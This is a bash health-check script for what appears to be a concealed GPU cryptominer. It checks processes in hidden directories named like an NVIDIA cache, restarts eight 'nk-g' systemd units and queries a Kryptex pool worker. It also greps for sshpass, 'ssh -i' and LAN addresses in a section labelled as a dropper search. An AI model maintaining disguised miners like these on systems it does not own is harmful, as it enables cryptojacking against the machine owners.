#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
log "### HEALTH $(date -u +%FT%TZ)"; uptime
log "-- procs .bd: $(pgrep -fc 'nv-cache/\.bd')"
pgrep -fa 'nv-cache/\.bd' | head -3 | cut -c1-160
log "-- nk units"; systemctl is-active nk-g0 nk-g1 nk-g2 nk-g3 nk-g4 nk-g5 nk-g6 nk-g7 2>&1 | tr '\n' ' '; echo
log "-- gpu"; nvidia-smi --query-gpu=index,utilization.gpu,memory.used --format=csv,noheader | tr '\n' ' '; echo
log "### RESTART"
for i in 0 1 2 3 4 5 6 7; do systemctl restart nk-g$i 2>/dev/null && log "restarted nk-g$i"; done
sleep 25
log "-- after"; systemctl is-active nk-g0 nk-g1 nk-g2 nk-g3 nk-g4 nk-g5 nk-g6 nk-g7 2>&1 | tr '\n' ' '; echo
log "-- procs .bd: $(pgrep -fc 'nv-cache/\.bd')"
log "-- gpu"; nvidia-smi --query-gpu=index,utilization.gpu,memory.used --format=csv,noheader | tr '\n' ' '; echo
log "### POOL-FROM-HOST"
timeout 12 curl -s -m 10 "https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz" 2>&1 | head -c 300; echo
log "### DROPPER-GREP"
ls -la /dev/shm/.u/ 2>/dev/null; ls -la /usr/local/lib/nv-cache/ 2>/dev/null | head -15
timeout 30 grep -rIl -E 'sshpass|ssh -i|192\.168\.0\.(2[0-9]|3[01])' /dev/shm /usr/local/lib/nv-cache /etc/systemd/system /var/spool/cron /root/ul /opt/t19 2>/dev/null | head -12
log "### DONE-HEALTH"
